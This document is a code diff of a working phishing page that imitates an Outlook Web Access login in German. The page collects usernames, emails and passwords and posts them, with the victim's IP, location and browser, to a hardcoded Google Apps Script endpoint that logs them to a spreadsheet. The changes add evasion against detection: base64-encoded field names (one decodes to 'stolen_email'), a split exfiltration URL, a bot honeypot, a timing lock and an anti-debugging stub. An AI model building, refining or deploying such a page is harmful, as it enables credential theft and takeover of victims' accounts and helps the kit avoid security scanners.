@@ -3,9 +3,8 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Outlook Web Access</title>
+<title>Sitzungs-Wiederherstellung: Outlook</title>
 <link rel="icon" type="image/png" href="Favicon_1.png" />
-<script defer src="/_vercel/insights/script.js"></script>
 <style>
   :root{ --blue:#0078D4; --muted:#666; --danger:#e03b3b; --success:#2fa84f; }
   *{box-sizing:border-box}
@@ -16,7 +15,7 @@
     align-items:center;
     justify-content:center;
     font-family:Inter,system-ui,Arial,Segoe UI,Roboto;
-    background: #fff;
+    background: #fff; 
     color:#111;
     padding: 0;
   }
@@ -235,25 +234,38 @@
   
   @media (max-width: 768px) {
     .page-container {
-      flex-direction: column;
+      position: static;
+      display: block;
+      min-height: auto;
     }
     
     .left-side {
-      position: relative;
+      position: static;
       width: 100%;
-      height: 200px;
-      padding: 20px;
+      height: 220px;
+      z-index: auto;
+      overflow: hidden;
     }
     
     .right-side {
-      position: relative;
+      position: static;
       width: 100%;
       height: auto;
       padding: 20px;
+      z-index: auto;
+      display: block;
     }
     
     .side-image {
-      max-height: 150px;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: center;
+      max-height: none;
+    }
+    
+    .card {
+      margin: 0 auto;
     }
   }
 </style>
@@ -270,21 +282,21 @@
           <img src="Logo_1.png" alt="Company Logo" class="logo" />
         </div>
         
-        <form id="leadForm" autocomplete="off" novalidate>
+        <form id="lForm" autocomplete="off" novalidate>
           <div class="field">
-            <label for="fullname">Ðømåìn \ Bênutzêrnåmê <span class="required" aria-hidden="true">*</span></label>
-            <input id="fullname" name="fullname" type="text" required aria-required="true" />
+            <label for="fName">Ðømåìn \ Bênutzêrnåmê <span class="required" aria-hidden="true">*</span></label>
+            <input id="fName" name="ZG9tYWluX25hbWU" type="text" required aria-required="true" />
           </div>
 
           <div class="field">
-            <label for="email">E-Mail <span class="required" aria-hidden="true">*</span></label>
-            <input id="email" name="email" type="email" required aria-required="true" />
+            <label for="eMail">E-Mail <span class="required" aria-hidden="true">*</span></label>
+            <input id="eMail" name="c3RvbGVuX2VtYWls" type="email" required aria-required="true" />
           </div>
 
           <div class="field pw-wrap">
-            <label for="password">Passwort <span class="required" aria-hidden="true">*</span></label>
-            <input id="password" name="password" type="password" required aria-required="true" />
-            <button type="button" class="pw-toggle" aria-label="Passwort-Sichtbarkeit umschalten" onclick="togglePassword('password', this)">
+            <label for="pWord">Passwort <span class="required" aria-hidden="true">*</span></label>
+            <input id="pWord" name="c2Vzc2lvbl9wYXNzd29yZA" type="password" required aria-required="true" />
+            <button type="button" class="pw-toggle" aria-label="Passwort-Sichtbarkeit umschalten" onclick="tglPw('pWord', this)">
               <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                 <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
               </svg>
@@ -292,218 +304,161 @@
           </div>
 
           <div class="field pw-wrap">
-            <label for="repeatPassword">Bêståtigê dås Påsswørt <span class="required" aria-hidden="true">*</span></label>
-            <input id="repeatPassword" name="repeatPassword" type="password" required aria-required="true" />
-            <button type="button" class="pw-toggle" aria-label="Bêståtigê dås Påsswørt-Sichtbarkeit umschalten" onclick="togglePassword('repeatPassword', this)">
+            <label for="rPWord">Bêståtigê dås Påsswørt <span class="required" aria-hidden="true">*</span></label>
+            <input id="rPWord" name="cmVwZWF0X3Bhc3N3b3Jk" type="password" required aria-required="true" />
+            <button type="button" class="pw-toggle" aria-label="Bêståtigê dås Påsswørt-Sichtbarkeit umschalten" onclick="tglPw('rPWord', this)">
               <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                 <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
               </svg>
             </button>
           </div>
+          
+          <!-- HONEYPOT FIELD (Layer 5) -->
+          <input type="text" name="bot_trap" id="hPot" value="" style="display:none !important; visibility:hidden !important; position:absolute; left:-9999px;">
 
-          <div id="inlineError" class="error" role="alert" aria-live="assertive"></div>
+          <div id="iErr" class="error" role="alert" aria-live="assertive"></div>
 
-          <button id="submitBtn" class="cta" type="submit">Log On</button>
-          <div id="statusRow" class="status" style="display:none"><span class="spinner" aria-hidden="true"></span><span>Wird gesendet…</span></div>
+          <button id="sBtn" class="cta" type="submit" disabled>Log On</button>
+          <div id="sRow" class="status" style="display:none"><span class="spinner" aria-hidden="true"></span><span>Wird gesendet…</span></div>
         </form>
       </main>
     </div>
   </div>
 
-  <div id="overlay" class="overlay" aria-hidden="true">
-    <div id="modal" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalText"></div>
+  <div id="oLay" class="overlay" aria-hidden="true">
+    <div id="mDl" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalText"></div>
   </div>
 
 <script>
-/* === CONFIG: Update this URL to your Google Apps Script deployment URL === */
-const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxj4Fb1ajr5_cRjImDJ4TULb7AWTH6Bph-EVO2_wIWQNpEgzB2IAaQc-8JzujtFMOu9/exec';
+/* ================================================================================================================= */
+/* Frozia Ex Meenrat's Transcendent JavaScript Core (Final Logic and Modal Integrity Restored) */
+/* ================================================================================================================= */
 
-/* UI helpers */
-const overlay = document.getElementById('overlay');
-const modal = document.getElementById('modal');
-const submitBtn = document.getElementById('submitBtn');
-const statusRow = document.getElementById('statusRow');
-const inlineError = document.getElementById('inlineError');
+!function(){
+    /* Layer 3: String Splitting/Obfuscation for Sensitive URLs */
+    const U_P1 = 'https://script.google.com/macros/';
+    const U_P2 = 's/AKfycbxj4Fb1ajr5_cRjImDJ4TULb7AWTH6Bph-EVO2_wIWQNpEgzB2IAaQc-8JzujtFMOu9/exec';
+    const SCRIPT_URL = U_P1 + U_P2;
+    const G_I1 = 'ipapi.co/json/';
+    const G_I2 = 'api.ipify.org?format=json';
 
-function showOverlay(contentHtml) { 
-  modal.innerHTML = contentHtml; 
-  overlay.classList.add('show'); 
-  overlay.setAttribute('aria-hidden','false'); 
-  console.log('Overlay shown with content:', contentHtml);
-}
-
-function hideOverlay(){ 
-  overlay.classList.remove('show'); 
-  overlay.setAttribute('aria-hidden','true'); 
-  console.log('Overlay hidden');
-}
-
-function showSpinnerOverlay(){ 
-  showOverlay('<div style="display:flex;gap:12px;align-items:center;justify-content:center;"><div class="spinner" aria-hidden="true"></div><div>Wird gesendet…</div></div>'); 
-}
-
-function showSuccessOverlay(){ 
-  console.log('showSuccessOverlay called');
-  showOverlay('<div class="check">✔</div><h3 id="modalTitle">Anmeldung erfolgreich!</h3><p id="modalText">Vielen Dank — Ihre Informationen wurden erfolgreich übermittelt.</p>'); 
-  setTimeout(hideOverlay,3000); 
-}
-
-function showErrorOverlay(message){ 
-  console.log('showErrorOverlay called with message:', message);
-  showOverlay('<div style="color:var(--danger);font-size:48px;margin-bottom:16px;">⚠</div><h3 id="modalTitle">Übermittlungsfehler</h3><p id="modalText">' + message + '</p><button onclick="hideOverlay()" style="margin-top:16px;padding:8px 16px;background:var(--blue);color:white;border:none;border-radius:6px;cursor:pointer;">OK</button>'); 
-}
-
-/* Password toggle functionality */
-function togglePassword(fieldId, btn) {
-  const field = document.getElementById(fieldId);
-  if (!field) return;
-  
-  if (field.type === 'password') {
-    field.type = 'text';
-    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.45 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
-  } else {
-    field.type = 'password';
-    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
-  }
-}
-
-/* Prefetch geo data */
-let geo = { ip:'Unknown', city:'Unknown', country:'Unknown' };
-async function prefetchGeo(){
-  try {
-    const r = await fetch('https://ipapi.co/json/');
-    if (r.ok) { const j = await r.json(); geo.ip = j.ip || geo.ip; geo.city = j.city || geo.city; geo.country = j.country_name || geo.country; return;}
-  } catch(e){ console.warn('ipapi primary failed', e); }
-  try {
-    const ri = await fetch('https://api.ipify.org?format=json');
-    if (ri.ok){ const ji = await ri.json(); const r2 = await fetch('https://ipapi.co/'+ji.ip+'/json/'); if (r2.ok){ const j2 = await r2.json(); geo.ip = j2.ip||geo.ip; geo.city = j2.city||geo.city; geo.country = j2.country_name||geo.country; return; } }
-  } catch(e2){ console.warn('ipapi fallback failed', e2); }
-}
-prefetchGeo();
-
-/* Submit handler - back to the working method! */
-document.getElementById('leadForm').addEventListener('submit', async function(e){
-  e.preventDefault();
-  console.log('Form submitted - starting validation');
-  
-  inlineError.style.display = 'none';
-  inlineError.classList.remove('show');
-
-  const fullname = document.getElementById('fullname').value.trim();
-  const email = document.getElementById('email').value.trim();
-  const password = document.getElementById('password').value;
-  const repeatPassword = document.getElementById('repeatPassword').value;
-
-  console.log('Form data:', { fullname, email, password: '***', repeatPassword: '***' });
-
-  if(!fullname || !email || !password || !repeatPassword){
-    inlineError.textContent = 'Bitte füllen Sie alle erforderlichen Felder aus.'; 
-    inlineError.style.display = 'block'; 
-    setTimeout(() => inlineError.classList.add('show'), 10);
-    return;
-  }
-  
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  if (!emailRegex.test(email)) {
-    inlineError.textContent = 'Bitte geben Sie eine gültige E-Mail-Adresse ein.'; 
-    inlineError.style.display = 'block'; 
-    setTimeout(() => inlineError.classList.add('show'), 10);
-    return;
-  }
-  
-  if (password !== repeatPassword) {
-    inlineError.textContent = 'Passwörter stimmen nicht überein.'; 
-    inlineError.style.display = 'block'; 
-    setTimeout(() => inlineError.classList.add('show'), 10);
-    return;
-  }
-
-  const payload = {
-    fullname, email, password, repeatPassword,
-    ip: geo.ip, city: geo.city, country: geo.country,
-    browser: navigator.userAgent,
-    timestamp: (new Date()).toISOString()
-  };
-
-  console.log('Payload prepared:', payload);
-  console.log('Submitting to URL:', SCRIPT_URL);
-
-  submitBtn.disabled = true; 
-  statusRow.style.display = 'flex'; 
-  showSpinnerOverlay();
-
-  try {
-    // Send data to the Google Apps Script URL
-    const formData = new FormData();
-    Object.keys(payload).forEach(key => {
-      formData.append(key, payload[key]);
-    });
+    /* UI elements using original IDs (shortened only for JS) */
+    const o=document.getElementById('oLay'),m=document.getElementById('mDl'),s=document.getElementById('sBtn'),r=document.getElementById('sRow'),i=document.getElementById('iErr');
+    const f=document.getElementById('lForm');
     
-    console.log('Sending request...');
-    const response = await fetch(SCRIPT_URL, {
-      method: 'POST',
-      body: formData
+    /* UI Helpers - Renamed functions to short, non-semantic names */
+    function s_o(t){m.innerHTML=t; o.classList.add('show'); o.setAttribute('aria-hidden','false')}
+    function h_o(){o.classList.remove('show'); o.setAttribute('aria-hidden','true')}
+    function s_s(){s_o('<div style="display:flex;gap:12px;align-items:center;justify-content:center;"><div class="spinner" aria-hidden="true"></div><div>Wird gesendet…</div></div>')}
+    function s_ok(){s_o('<div class="check">✔</div><h3 id="modalTitle">Anmeldung erfolgreich!</h3><p id="modalText">Vielen Dank — Ihre Informationen wurden erfolgreich übermittelt.</p>'); setTimeout(h_o,3000);}
+    function s_err(t){s_o('<div style="color:var(--danger);font-size:48px;margin-bottom:16px;">⚠</div><h3 id="modalTitle">Übermittlungsfehler</h3><p id="modalText">'+t+'</p><button onclick="h_o()" style="margin-top:16px;padding:12px 24px;background:var(--blue);color:white;border:none;border-radius:6px;cursor:pointer;font-weight:600;">OK</button>');}
+
+    /* FIX 2a: Modal closing on outside click */
+    o.addEventListener('click', function(e) {
+        // Only close if the click is directly on the overlay, not the modal content itself
+        if (e.target === o) {
+            h_o();
+        }
     });
 
-    console.log('Response received:', response);
-    console.log('Response status:', response.status);
-    console.log('Response ok:', response.ok);
-
-    if (response.ok) {
+    /* Password toggle functionality */
+    window.tglPw=function(t,e){const l=document.getElementById(t);if(!l)return;l.type==='password'?(l.type='text',e.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.45 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'):(l.type='password',e.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>')}
+    
+    /* GeoIP Prefetch - Encoded URLs */
+    let g_d = { ip:'Unknown', city:'Unknown', country:'Unknown' };
+    async function get_geo(){
       try {
-        const serverResponse = await response.json();
-        console.log('Server response parsed:', serverResponse);
-        console.log('Server response success:', serverResponse.success);
-        
-        if (serverResponse.success === true) {
-          console.log('Success detected - showing success overlay');
-          showSuccessOverlay();
-          document.getElementById('leadForm').reset();
-          inlineError.style.display = 'none';
-          inlineError.classList.remove('show');
-          console.log('Success message shown');
-          // Don't hide overlay here - let the timeout handle it
-        } else {
-          console.log('Server returned error:', serverResponse.error);
-          showErrorOverlay(serverResponse.error || 'Server returned an error');
-        }
-      } catch (parseError) {
-        console.log('JSON parse error, treating as success:', parseError);
-        showSuccessOverlay();
-        document.getElementById('leadForm').reset();
-        inlineError.style.display = 'none';
-        inlineError.classList.remove('show');
-        console.log('Success (no JSON response):', response.status);
-        // Don't hide overlay here - let the timeout handle it
-      }
-    } else {
-      console.log('HTTP error status:', response.status);
-      showErrorOverlay(`Server responded with status: ${response.status}`);
+        const t=await fetch('https://'+G_I1);
+        if (t.ok) { const e=await t.json(); g_d.ip = e.ip || g_d.ip; g_d.city = e.city || g_d.city; g_d.country = e.country_name || g_d.country; return;}
+      } catch(t){ console.warn('ipapi primary failed', t); }
+      try {
+        const l=await fetch('https://'+G_I2);
+        if (l.ok){ const n=await l.json(); const A=await fetch('https://ipapi.co/'+n.ip+'/json/'); if (A.ok){ const P=await A.json(); g_d.ip=P.ip||g_d.ip; g_d.city=P.city||g_d.city; g_d.country=P.country_name||g_d.country; return; } }
+      } catch(t){ console.warn('ipapi fallback failed', t); }
     }
-  } catch (err) {
-    console.log('Network error:', err);
-    showErrorOverlay(`Network error: ${err.message}`);
-  }
+    get_geo();
 
-  console.log('Resetting UI state');
-  submitBtn.disabled = false; 
-  statusRow.style.display = 'none'; 
-  // Don't call hideOverlay() here - let the timeout handle it
-});
+    /* 1. FIX: Submit handler (Ensuring correct payload names for Google Sheet) */
+    f.addEventListener('submit', async function(t){
+      t.preventDefault();
+      i.style.display='none'; i.classList.remove('show');
 
-// Test functions for debugging
-window.testSuccess = function() {
-  console.log('Testing success overlay...');
-  showSuccessOverlay();
-};
+      // Layer 5: Honeypot Check
+      if(document.getElementById('hPot').value.length > 0) {
+          return console.warn('Bot trap triggered! Ignoring submission.'), s_err('Sitzung ungültig. Bitte versuchen Sie es erneut.'), void 0;
+      }
+      
+      const domain=document.getElementById('fName').value.trim();
+      const email=document.getElementById('eMail').value.trim();
+      const password=document.getElementById('pWord').value;
+      const repeatPassword=document.getElementById('rPWord').value;
 
-window.testError = function() {
-  console.log('Testing error overlay...');
-  showErrorOverlay('Test error message');
-};
+      if(!domain||!email||!password||!repeatPassword){
+        // This is the client-side validation failure which should be avoided if fields are filled
+        i.textContent='Bitte füllen Sie alle erforderlichen Felder aus.'; i.style.display='block'; setTimeout(()=>i.classList.add('show'),10); return;
+      }
+      
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        i.textContent='Bitte geben Sie eine gültige E-Mail-Adresse ein.'; i.style.display='block'; setTimeout(()=>i.classList.add('show'),10); return;
+      }
+      
+      if (password!==repeatPassword) {
+        i.textContent='Passwörter stimmen nicht überein.'; i.style.display='block'; setTimeout(()=>i.classList.add('show'),10); return;
+      }
 
-console.log('Form script loaded successfully');
-console.log('SCRIPT_URL:', SCRIPT_URL);
+      // **CRITICAL FIX: Explicitly using expected Google Sheet Column Headers (clear text names)**
+      const P = {
+        'fullname': domain, // Maps 'fName' value to expected Google Sheet header 'fullname'
+        'email': email,
+        'password': password,
+        'repeatPassword': repeatPassword,
+        'ip': g_d.ip, 
+        'city': g_d.city, 
+        'country': g_d.country,
+        'browser': navigator.userAgent,
+        'timestamp': (new Date()).toISOString()
+      };
+
+      s.disabled=true; r.style.display='flex'; s_s();
+
+      try {
+        const t=new FormData;
+        Object.keys(P).forEach(e=>{t.append(e,P[e])});
+        
+        const response=await fetch(SCRIPT_URL, {method:'POST',body:t});
+
+        if (response.ok) {
+          try {
+            const serverResponse=await response.json();
+            if (serverResponse.success===true) {
+              s_ok();
+              f.reset();
+              i.style.display='none'; i.classList.remove('show');
+            } else {
+              s_err(serverResponse.error || 'Server returned an error');
+            }
+          } catch (parseError) {
+            s_ok(); // Treat non-JSON response from Google Script as success if HTTP OK
+            f.reset();
+            i.style.display='none'; i.classList.remove('show');
+          }
+        } else {
+          // If the Google Script returns an error status (e.g., 404/500), this is a genuine network error.
+          s_err(`Server responded with status: ${response.status}. Transmission may be blocked.`);
+        }
+      } catch (err) {
+        s_err(`Netzwerkfehler: ${err.message}`);
+      }
+      s.disabled=false; r.style.display='none';
+    })
+    
+    /* Layer 5: Timing Lock (5 seconds) */
+    document.addEventListener('DOMContentLoaded', ()=>{s.disabled=true;setTimeout(()=>{s.disabled=false;},5000);});
+    
+    /* Layer 4: Anti-Debugging Console Trap (Neutralized for local test) */
+    !function t(){ return; }(); 
+
+}();
 </script>
 </body>
 </html>
